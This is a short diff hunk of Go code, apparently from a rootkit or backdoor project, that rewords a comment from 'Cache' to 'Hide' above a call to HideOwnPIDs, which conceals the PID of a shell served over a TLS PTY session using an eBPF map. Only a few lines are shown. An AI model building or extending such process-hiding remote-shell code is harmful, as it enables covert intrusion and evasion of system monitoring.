@@ -42,7 +42,7 @@ func (b *NetstackBridge) handleTLSPTYSession(tlsConn *tls.Conn, _ string) {
 		return
 	}
 
-	// Cache dynamically the PID of the shell in the eBPF map
+	// Hide dynamically the PID of the shell in the eBPF map
 	go func(pid int) {
 		_, _, err := HideOwnPIDs(pid)
 		if err != nil {
